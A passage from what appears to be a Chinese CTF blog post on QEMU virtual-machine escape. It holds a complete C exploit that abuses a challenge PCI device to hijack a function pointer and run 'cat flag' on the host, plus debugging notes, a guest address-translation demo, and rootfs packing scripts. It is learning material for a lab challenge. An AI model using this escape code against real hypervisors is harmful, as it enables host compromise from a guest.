<p>最后控制参数的话，假设我们想执行 <code>cat flag</code> 这个命令，那么需要把 <code>r_seed</code> 设置为 <code>cat </code>，因为 <code>r_seed</code> 的大小就为四字节，所以只能存放 <code>cat </code>，而 <code>r_seed</code> 下面的数据就是 <code>blocks</code> ,所以在 <code>blocks[0]</code> 的位置存放字符串 <code>flag</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821106.png" alt="image-20230316160923121"></p>
<p>执行 <code>cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</code> 命令，获取 <code>0xfebf1000</code> 为 <code>MMIO</code> 基地址，<code>0xc040</code>  为 <code>PMIO</code> 基地址</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161819207.png" alt="image-20230316161803354" style="zoom:50%;" />

<h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMIO_BASE 0xc040</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">	perror(msg);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint64_t</span> *)(mmio_mem+addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> val)</span>&#123;</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(mmio_mem+addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> inl(PMIO_BASE+addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> val)</span>&#123;</span><br><span class="line">    outl(val, PMIO_BASE+addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decode</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>])</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        i -= <span class="number">0x61C88647</span>;</span><br><span class="line">        v[<span class="number">0</span>] += ((v[<span class="number">1</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">1</span>]+i)^((v[<span class="number">1</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">        v[<span class="number">1</span>] += ((v[<span class="number">0</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">0</span>]+i)^((v[<span class="number">0</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">    &#125; <span class="keyword">while</span>(i!=<span class="number">0xC6EF3720</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">encode</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>])</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0xC6EF3720</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        v[<span class="number">1</span>] -= ((v[<span class="number">0</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">0</span>]+i)^((v[<span class="number">0</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">        v[<span class="number">0</span>] -= ((v[<span class="number">1</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">1</span>]+i)^((v[<span class="number">1</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">        i += <span class="number">0x61C88647</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000\:00/0000\:00\:03.0/resource0&quot;</span>,O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd==<span class="number">-1</span>)&#123;  perror(<span class="string">&quot;mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);  &#125;</span><br><span class="line"> </span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED,mmio_fd,<span class="number">0</span>);     <span class="comment">//mmap mmio space</span></span><br><span class="line">    <span class="keyword">if</span>(mmio_mem == MAP_FAILED)&#123; perror(<span class="string">&quot;map mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;addr of mmio:%p\n&quot;</span>,mmio_mem);</span><br><span class="line">    <span class="keyword">if</span>(iopl(<span class="number">3</span>)!=<span class="number">0</span>)&#123;perror(<span class="string">&quot;iopl failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">    getchar();</span><br><span class="line">    pmio_write(<span class="number">4</span>,<span class="number">0x0</span>);<span class="comment">//set the key to 0</span></span><br><span class="line">    pmio_write(<span class="number">8</span>,<span class="number">0x100</span>);<span class="comment">//set the seek to 0x100 to prevent addr from overflow the MMIO area</span></span><br><span class="line">    <span class="type">uint64_t</span> rand_r=mmio_read(<span class="number">0x18</span>);<span class="comment">//get address after the tea encode</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rand_r address before decode is @%lx\n&quot;</span>,rand_r);</span><br><span class="line">    decode(&amp;rand_r);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rand_r address after decode is @%llx\n&quot;</span>,rand_r);</span><br><span class="line">    <span class="type">uint64_t</span> sys_addr=rand_r+<span class="number">0xa5e0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;system address is @%llx\n&quot;</span>,sys_addr);</span><br><span class="line">    encode(&amp;sys_addr);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>,sys_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> args=<span class="number">0x67616c66</span>;</span><br><span class="line">    pmio_write(<span class="number">8</span>,<span class="number">0x0</span>);<span class="comment">//set the seek to 0</span></span><br><span class="line">    encode(&amp;args);</span><br><span class="line">    mmio_write(<span class="number">0x0</span>,args);  <span class="comment">// flag</span></span><br><span class="line">    pmio_write(<span class="number">0x1C</span>, <span class="number">0x20746163</span>);  <span class="comment">// cat</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821302.png" alt="image-20230316162420666" style="zoom: 67%;" />



<h2 id="奇奇怪怪的技能"><a href="#奇奇怪怪的技能" class="headerlink" title="奇奇怪怪的技能"></a>奇奇怪怪的技能</h2><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>执行 <code>launch.sh</code> 脚本，将 <code>qemu</code> 启动起来，然后用 <code>ps -a | grep qemu</code> 来查看 <code>qemu</code> 的进程号，接着 <code>sudo gdb qemu-system-x86_64</code>  来开 <code>gdb</code> ，再输入 <code>attach pid</code>  附加进程开始调试（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302261609688.png" alt="image-20230226160922771"></p>
<p>假设我们现在想从 <code>qemu-system</code> 中的 <code>vn_mmio_read</code> 函数这里开始调试，那么我们下该函数的断点（本题的 <code>qemu-system</code> 并没有开 <code>PIE</code> ，所以直接下断点即可，如果开 <code>PIE</code> 的话别忘记加基地址），并在 <code>qemu</code> 中运行 <code>exp</code> （如下），从而来调试查看我们关注的信息</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302261610355.png" alt="image-20230226161041668"></p>
<h3 id="qemu中的虚拟内存与物理内存"><a href="#qemu中的虚拟内存与物理内存" class="headerlink" title="qemu中的虚拟内存与物理内存"></a>qemu中的虚拟内存与物理内存</h3><p>在这之前要先明白两点，第一点是客户机 指的是运行在虚拟机中的操作系统及其应用程序。而宿主机 则指的是运行虚拟机的物理机 。第二，<code>qemu</code> 跑在宿主机里，本质上就是一个进程，和其他进程没有任何区别</p>
<p>所以接下来有四个地址，分别是 客户机的物理地址，客户机的虚拟地址，宿主机的物理地址，宿主机的虚拟地址</p>
<ul>
<li><p>宿主机的物理地址：指的是物理内存条上的地址，即硬件直接访问的物理地址。</p>
</li>
<li><p>宿主机的虚拟地址：操作系统所呈现给我们的虚假地址，它们被用来访问宿主机上的进程</p>
</li>
<li><p>客户机的物理地址：由 <code>qemu</code> 程序执行了 <code>mmap</code> 函数，映射了一片内存空间出来，作为客户机的物理地址</p>
</li>
<li><p>客户机的虚拟地址：客户机里的操作系统将刚刚映射出来的那片内存空间经过转换，呈现给我们了一个虚假地址</p>
</li>
</ul>
<p>此时如果再去仔细分析下面这个图 （来自 <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-265501.htm">https://bbs.kanxue.com/thread-265501.htm</a> ）  的话，就大概能体会到这些地址直接的关系了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                       Guest&#x27; processes</span><br><span class="line">                     +--------------------+</span><br><span class="line">Virtual addr space   |                    |</span><br><span class="line">                     +--------------------+                                    （GVA）</span><br><span class="line">                     |                    |</span><br><span class="line">                     \__   Page Table     \__</span><br><span class="line">                        \                    \</span><br><span class="line">                         |                    |  Guest kernel</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">Guest&#x27;s phy. memory |    |                    |                |            （GPA）</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">                    |                                          |</span><br><span class="line">                    \__                                        \__</span><br><span class="line">                       \                                          \</span><br><span class="line">                        |             QEMU process                 |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">Virtual addr space |    |                                          |         （HVA）</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">                   |                                               |</span><br><span class="line">                    \__                Page Table                   \__</span><br><span class="line">                       \                                               \</span><br><span class="line">                        |                                               |</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line">Physical memory    |    |                                               ||    （HPA）</span><br><span class="line">                   +----+-----------------------------------------------++</span><br></pre></td></tr></table></figure>



<h4 id="虚拟地址转换物理地址的过程"><a href="#虚拟地址转换物理地址的过程" class="headerlink" title="虚拟地址转换物理地址的过程"></a>虚拟地址转换物理地址的过程</h4><p>然后简单说一下将虚拟地址转换为物理地址的思路</p>
<p>每个进程都有自己的页表（存储在 <code>/proc/self/pagemap</code> 文件中），页表由一个或多个页表项组成，每个页表项记录了一个虚拟页到物理页的映射关系，在 <code>64</code> 位 <code>Linux</code> 系统中，页表项为 <code>64</code> 位。</p>
<p>现在给出一个虚拟地址，将其右移 <code>9</code> 位的话，得到的是页表项偏移量（页表项在页表中的偏移）,这里 <code>&amp; ~7</code> 是将页表项偏移量向下对齐到8字节边界上（因为页表项是八字节，这里是要八字节对齐）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">offset = (addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span></span><br></pre></td></tr></table></figure>



<p>得到页表项偏移量之后，我们就可以去用 <code>lseek</code> 和 <code>read</code> 函数从 <code>pagemap</code> 文件中读取一个页表项的信息，读取出来的信息包括：</p>
<ul>
<li><p>bit 0-54 存储物理页帧号</p>
</li>
<li><p>bit 55-62 为保留位</p>
</li>
<li><p>bit 63 存储页面是否存在</p>
<p>如果存储页面存在的话，那我们就读取它的物理页帧号，最终要获取物理的地址的话，需要物理页帧号和页面内偏移量（虚拟地址将其右移 <code>12</code> 位），因此我们最后的物理地址是将物理页帧号左移 <code>12</code> 位，将其或（ <code>|</code> ）上页面内偏移量，即可得到物理地址。</p>
</li>
</ul>
<h4 id="程序验证"><a href="#程序验证" class="headerlink" title="程序验证"></a>程序验证</h4><p>用网上其他师傅的一个程序来验证一下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="comment">// 获取页内偏移</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// addr &amp; 0xfff</span></span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gfn</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pfn_item_offset : %p\n&quot;</span>, (<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>);</span><br><span class="line">    offset = ((<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;<span class="comment">//得到的是页表项偏移量</span></span><br><span class="line"> </span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);<span class="comment">//读取一个页表项的信息</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))<span class="comment">// 确保页面存在——page is present.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// physical frame number</span></span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;<span class="comment">//返回物理页帧号</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gpa</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="type">uint64_t</span>)addr);<span class="comment">//通过物理页帧号和页内偏移量来得到物理地址</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> *ptr;</span><br><span class="line">    <span class="type">uint64_t</span> ptr_mem;</span><br><span class="line"> </span><br><span class="line">    fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;virtual address %p\n&quot;</span>,ptr);</span><br><span class="line">    <span class="built_in">strcpy</span>(ptr, <span class="string">&quot;Where am I?&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, ptr);</span><br><span class="line">    ptr_mem = gva_to_gpa(ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your physical address is at 0x%&quot;</span>PRIx64<span class="string">&quot;\n&quot;</span>, ptr_mem);</span><br><span class="line"> </span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将其编译后放入 <code>qemu</code> 中，调试一下。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303051312873.png" alt="image-20230305131217704"></p>
<p>因为启 <code>qemu</code> 的时候，给的是 <code>64M</code> 的内存，所以我们去找这个 <code>0x4000000</code>  的起始内存地址，发现是 <code>0x7fc254c00000</code> ，然后用这个地址加上物理内存，就能找到字符串 <code>Where am I?</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303051350957.png" alt="image-20230305135007883"></p>
<p>如果我们希望本地调试脚本，那么肯定是需要将 <code>exp</code> 文件放入到 <code>qemu</code> 中的，这里的通用方法是本地先将文件系统解包，然后把 <code>exp.c</code> 放进去，再打包即可，具体方法如下</p>
<h3 id="解包和打包脚本"><a href="#解包和打包脚本" class="headerlink" title="解包和打包脚本"></a>解包和打包脚本</h3><h4 id="对-cpio-文件的打包和解包"><a href="#对-cpio-文件的打包和解包" class="headerlink" title="对 cpio 文件的打包和解包"></a>对 <code>cpio</code> 文件的打包和解包</h4><p>解包脚本（如果缺少 <code>unar</code> 的话，请自行安装） 转自 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f08e34cf08ad">https://www.jianshu.com/p/f08e34cf08ad</a>  如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">mv $1 $1.gz</span><br><span class="line">unar $1.gz</span><br><span class="line">mv $1 core</span><br><span class="line">mv $1.gz $1</span><br><span class="line">echo &quot;[+]Successful&quot;</span><br></pre></td></tr></table></figure>

<p>打包脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; $1 </span><br><span class="line">mv $1 ..</span><br></pre></td></tr></table></figure>

<p>将这两个脚本都放置到 <code>/usr/local/bin</code> 目录下，将解包脚本命名为 <code>hen</code>  打包脚本命名为 <code>gen</code></p>
<p><strong>最后别忘记给它们可执行权限</strong></p>
<h5 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h5><p>使用 <code>hen rootfs.cpio</code> 命令会在当前目录生成一个 <code>core</code> 文件夹，然后 <code>cd core</code> ，将准备编译好的 <code>exp</code> 文件复制进来。然后在 <code>core</code> 目录执行 <code>gen rootfs.cpio</code> 命令即可（注意，解包命令是在 <code>core</code> 文件的上一级使用的，打包命令是在 <code>core</code> 文件中使用的）</p>
<p>最后重新运行 <code>launch.sh</code> ，进入到 <code>qemu</code> 中后，就可以看到 <code>exp</code> 文件了。</p>
<h4 id="对-img-文件的打包和解包"><a href="#对-img-文件的打包和解包" class="headerlink" title="对 img 文件的打包和解包"></a>对 <code>img</code> 文件的打包和解包</h4><p>如果是 <code>rootfs.img</code> 文件的话，就创建一个 <code>rootfs</code> 文件夹，然后将 <code>rootfs.img</code> 文件复制进去，执行命令 <code>cpio -ivmd &lt; rootfs.img </code> ，解包后，将 <code>exp</code> 复制到 <code>rootfs</code> 文件夹中，然后执行命令（在 <code>rootfs</code> 文件中执行） <code>find . | cpio -o -H newc | gzip -9  &gt; ../rootfs.img </code> 即可将 <code>exp</code> 打包进去。</p>
<h3 id="musl-gcc-的编译与环境变量的配置"><a href="#musl-gcc-的编译与环境变量的配置" class="headerlink" title="musl-gcc 的编译与环境变量的配置"></a>musl-gcc 的编译与环境变量的配置</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.musl-libc.org/releases/musl-latest.tar.gz</span><br><span class="line">tar zxvf musl-latest.tar.gz</span><br></pre></td></tr></table></figure>

<p>然后 <code>cd</code> 进入解压之后的目录，执行下面的命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<p>注意命令执行的权限</p>
<p>接下来，如果你能用绝对路径来执行 <code>musl-gcc</code> 那就说明安装的没问题，然后来配置环境变量</p>
<p>如果你和我一样使用的是 <code>zsh shell</code> （在命令行中输入 <code>echo $0</code> 可以进行确认），那么应该将环境变量设置添加到 <code>~/.zshrc</code> 文件中</p>
<p>将下面的命令添加到 <code>~/.zshrc</code> 文件的末尾</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if [ -d &quot;/usr/local/musl/bin&quot; ] ; then</span><br><span class="line">    PATH=&quot;/usr/local/musl/bin:$PATH&quot;</span><br><span class="line">fi</span><br><span class="line">export PATH</span><br></pre></td></tr></table></figure>

<p>然后使用下面的命令，重新加载 <code>.zshrc</code> 文件即可（此时输入 <code>musl-gcc</code> 就可以正常使用了）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure>



<h4 id="缺少库-报错解决"><a href="#缺少库-报错解决" class="headerlink" title="缺少库 报错解决"></a>缺少库 报错解决</h4><p>最开始在 <code>ubuntu 18.04</code> 上运行发现缺少库，然后 <code>ldd</code> 看了一下（情况如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821585.png" alt="image-20230313230807235"></p>
<p>这应该是 <code>libc</code> 版本太低导致的，于是我就改用了 <code>22.04</code> </p>
<p>此时的报错如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821453.png" alt="image-20230313231108491"></p>
<p>然后 <code>winmt</code> 师傅教我的解决思路是 <code>apt search xxx</code> 来搜索缺少的库， <code>xxx</code> 则是 <code>so</code> 前面的数据，也就是 <code>libbrlapi</code>（效果如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161822783.png" alt="image-20230313231250902" style="zoom: 67%;" />



<p>然后我是把这几个库全给安装了 ，命令是 <code>sudo apt install xxx</code></p>
<p>不过发现依然是这个报错，于是执行命令 <code>find /usr/lib -name &quot;libbrlapi*&quot;</code> 效果如下</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161822719.png" alt="image-20230313231502355" style="zoom:67%;" />

<p>可以发现，现在的 <code>/usr/lib</code> 目录下是安装了 <code>/usr/lib/x86_64-linux-gnu/libbrlapi.so.0.8</code> ，但是这个 <code>qemu-system-x86_64</code> 需要的是 <code>libbrlapi.so.0.7</code> ，于是按照 <code>winmt</code> 师傅所说，创建了一个名字叫做 <code>libbrlapi.so.0.7</code> 的软链接，命令是 <code>sudo ln -s libbrlapi.so.0.8 libbrlapi.so.0.7</code> ，最终问题解决，可以成功启动 <code>qemu</code>。</p>
<p><strong>总结：</strong> 遇见这种少库的思路就是先 <code>apt search</code> 看一下少的库，然后少哪个安哪个即可，如果安装之后还少库，那么可能是按照的版本不对，创建一个软链接即可</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f08e34cf08ad">qemu逃逸学习笔记 - 简书 (jianshu.com)</a></p>
<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-265501.htm#msg_header_h2_6">原创]QEMU逃逸初探-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#pci%E8%AE%BE%E5%A4%87%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4">qemu-pwn-基础知识 « 平凡路上 (ray-cp.github.io)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45209963/article/details/127332351">(45条消息) qemu逃逸小识_mmio_write_xyzmpv的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/">QEMU 逃逸 潦草笔记 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/588124131">QEMU逃逸系列 - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254906">QEMU逃逸初探（一）-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://cyyyber.icu/2022/01/20/%E4%BB%8E%E4%B8%80%E9%81%93%E4%BE%8B%E9%A2%98%E5%AD%A6%E4%B9%A0QEMU%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86/">https://cyyyber.icu/2022/01/20/%E4%BB%8E%E4%B8%80%E9%81%93%E4%BE%8B%E9%A2%98%E5%AD%A6%E4%B9%A0QEMU%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86/</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/6c83c2a2.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/6c83c2a2.html" class="post-title-link" itemprop="url">关于house of husk的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:58:00" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
